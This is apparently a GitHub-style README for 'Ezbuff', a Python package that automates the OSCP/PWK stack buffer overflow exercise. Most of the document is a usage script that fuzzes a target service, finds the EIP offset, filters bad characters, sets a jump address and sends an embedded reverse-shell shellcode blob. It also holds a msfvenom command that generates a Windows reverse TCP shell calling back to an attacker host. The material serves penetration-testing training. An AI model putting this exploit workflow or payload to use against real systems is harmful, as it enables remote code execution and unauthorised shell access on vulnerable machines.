# Ezbuff
Ezbuff is a Python package created to make the **2020 PWK buffer overflow** easier to perform and understand. I created this package because I am aware of the number of people who lose a lot of time during their **OSCP** exams because of the buffer overflow box and thought this would assist the process. Ezbuff does not perform the buffer overflow for you, it simply automates a lot of the procedures that need to be executed to accomplish a successful buffer overflow attack. Therefore, the manual labor like determining the actual number of bytes to send to crash the vulnerable application, filtering bad characters from registers, and payload generation are all left to the user.

## Installation
```python
pip3 install ezbuff
```

## Usage
```python
#!/usr/bin/env python3

from ezbuff import Overflow

def main():
	# Instanstantiate `Overflow` object
	obj = Overflow("192.168.230.10", 80, max_fuzz_bytes=2000)

	# check object value
	print(repr(obj))

	# Change the target IP if running in interactive Python interpreter
	obj.targ_ip = "127.0.0.1"

	# Change the target port number if running in interactive Python interpreter
	obj.targ_port = 443

	# The number of seconds to wait in between the fuzzing process,
	# default = 5
	obj.fuzz_interval_seconds = 1

	# Set the increment of the fuzzer to be 150 as opposed to
	# the default of 100
	obj.fuzz_increment = 150

	# Fuzz the vulnerable application
	# [!] watch your terminal to see the number of bytes send at each iteration
	#     and to obtain the number of bytes it took to crash the application
	obj.fuzz()

	# Sets the number of bytes to crash the application.
	# Make sure to accommodate space for reverse shell!!
	# [!] this should be set after running `fuzz` for the remainder of the process
	obj.num_bytes_crash = 1300

	# Sending pattern to determine offset
	# [*] the length of the pattern is determined by the `num_bytes_crash` property
	# 	  which is the number of bytes it took to crash the application plus the number
	#     of bytes you allocate for your shell code later on. This should require 
	#     an additional 300-400 bytes
	obj.send_pattern()

	# Get offset
	# pass in the value that overwrote the eip register and get offset
	# Get offset 
	offset = obj.get_offset("30416B30")
	print(offset)

	# Set offset value after retrieving the offset from the function above
	# [!] this should be set after running `get_offset` for the remainder of the process
	obj.offset = 780

	# Testing offset (obj.offset must be set from)
	# [!] after run this you should see 4 B's (42424242) in the eip register
	obj.test("offset")

	# Add bad characters to list containing bad characters found
	# after sending string of characters
	# [!] after sending a string of characters and finding a bad character
	# 	  append the character as an argument to the function `add_bad_char`
	#	  as shown below. Also note that the `add_bad_char` function should be invoked
	#     only after sending the initial bad characters payload.
	obj.add_bad_char("\x0a", "\x0d", "\x25", "\x26", "\x2b", "\x3d")

	# Send payload with all characters to find bad characters.
	# [!] bad characters are removed depending on the characters passed
	#     as arguments to the `add_bad_char` function
	# Send payload with all characters to find bad characters
	obj.send_bad_chars()

	# Set the memory address to jump to after finding valid memory address
	# containing `jump` instructions set in x86 architecture
	# [!] the `jump_eip` must be bytes as shown below (prefix string with b)
	obj.jump_eip = b"\x83\x0c\x09\x10"

	# test the the memory address that `jump_eip` was set to, most likely
	# the memory address of a .dll without ASLR or DEP proctections.
	# [!] do not forget to set a break point at the address specified for the `jump_eip`
	#     to see if memory address overwrote the eip register appropiately
	obj.test("eip")

	# reverse shell payload
	# [!] must be in bytes (prefix every line of the shell with a b)
	shellcode = (
b"\xbe\x88\xe8\x2f\x51\xdb\xc0\xd9\x74\x24\xf4\x5a\x31\xc9\xb1"
b"\x52\x83\xc2\x04\x31\x72\x0e\x03\xfa\xe6\xcd\xa4\x06\x1e\x93"
b"\x47\xf6\xdf\xf4\xce\x13\xee\x34\xb4\x50\x41\x85\xbe\x34\x6e"
b"\x6e\x92\xac\xe5\x02\x3b\xc3\x4e\xa8\x1d\xea\x4f\x81\x5e\x6d"
b"\xcc\xd8\xb2\x4d\xed\x12\xc7\x8c\x2a\x4e\x2a\xdc\xe3\x04\x99"
b"\xf0\x80\x51\x22\x7b\xda\x74\x22\x98\xab\x77\x03\x0f\xa7\x21"
b"\x83\xae\x64\x5a\x8a\xa8\x69\x67\x44\x43\x59\x13\x57\x85\x93"
b"\xdc\xf4\xe8\x1b\x2f\x04\x2d\x9b\xd0\x73\x47\xdf\x6d\x84\x9c"
b"\x9d\xa9\x01\x06\x05\x39\xb1\xe2\xb7\xee\x24\x61\xbb\x5b\x22"
b"\x2d\xd8\x5a\xe7\x46\xe4\xd7\x06\x88\x6c\xa3\x2c\x0c\x34\x77"
b"\x4c\x15\x90\xd6\x71\x45\x7b\x86\xd7\x0e\x96\xd3\x65\x4d\xff"
b"\x10\x44\x6d\xff\x3e\xdf\x1e\xcd\xe1\x4b\x88\x7d\x69\x52\x4f"
b"\x81\x40\x22\xdf\x7c\x6b\x53\xf6\xba\x3f\x03\x60\x6a\x40\xc8"
b"\x70\x93\x95\x5f\x20\x3b\x46\x20\x90\xfb\x36\xc8\xfa\xf3\x69"
b"\xe8\x05\xde\x01\x83\xfc\x89\xed\xfc\x89\xaf\x86\xfe\x75\x20"
b"\x7e\x76\x93\x2a\x90\xde\x0c\xc3\x09\x7b\xc6\x72\xd5\x51\xa3"
b"\xb5\x5d\x56\x54\x7b\x96\x13\x46\xec\x56\x6e\x34\xbb\x69\x44"
b"\x50\x27\xfb\x03\xa0\x2e\xe0\x9b\xf7\x67\xd6\xd5\x9d\x95\x41"
b"\x4c\x83\x67\x17\xb7\x07\xbc\xe4\x36\x86\x31\x50\x1d\x98\x8f"
b"\x59\x19\xcc\x5f\x0c\xf7\xba\x19\xe6\xb9\x14\xf0\x55\x10\xf0"
b"\x85\x95\xa3\x86\x89\xf3\x55\x66\x3b\xaa\x23\x99\xf4\x3a\xa4"
b"\xe2\xe8\xda\x4b\x39\xa9\xeb\x01\x63\x98\x63\xcc\xf6\x98\xe9"
b"\xef\x2d\xde\x17\x6c\xc7\x9f\xe3\x6c\xa2\x9a\xa8\x2a\x5f\xd7"
b"\xa1\xde\x5f\x44\xc1\xca")
	# `get_payload` takes a parameter which is the name of the reverse shell file you created with msfvenom
	# [*] Don't forget to set up your listener!
	obj.send_payload(shellcode)

if __name__ == '__main__':
	main()
```
## Generating payload
```bash
# Sample payload with Msfvenom:
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=1337 EXITFUNC=thread -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\3d"

# Or use Vengen (https://github.com/binexisHATT/Vengen) to generate payloads with your custom options!
```
